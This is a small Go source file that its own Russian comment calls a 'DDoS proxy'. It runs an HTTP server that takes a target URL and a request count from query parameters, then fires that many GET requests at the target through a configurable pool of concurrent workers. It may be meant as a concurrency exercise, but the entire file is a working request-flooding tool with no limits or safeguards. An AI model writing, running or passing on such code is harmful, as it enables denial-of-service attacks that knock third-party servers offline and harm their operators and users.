package main

import (
	"flag"
	"log"
	"net/http"
	"strconv"
)

type Job struct {
	URL string
}

func makeGetRequest(url string) {
	log.Println("making request to", url)

	_, err := http.Get(url)
	if err != nil {
		log.Println(err)
		return
	}

	log.Println("success", url)
}

func main() {
	// можно устанавливать число N через флаг
	workersCount := flag.Int("c", 1, "number of concurrent workers")
	flag.Parse()

	jobCh := make(chan *Job)
	for i := 0; i < *workersCount; i++ {
		go func() {
			for job := range jobCh {
				makeGetRequest(job.URL)
			}
		}()
	}

	// это DDoS-прокси
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		url := r.FormValue("url")

		reqsCountRaw := r.FormValue("num")
		reqsCount, err := strconv.Atoi(reqsCountRaw)
		if err != nil {
			http.Error(w, "wrong number", http.StatusBadRequest)
			return
		}

		for i := 0; i < reqsCount; i++ {
			job := &Job{URL: url}
			jobCh <- job
		}

		w.WriteHeader(http.StatusOK)
	})

	http.ListenAndServe(":8080", nil)
}
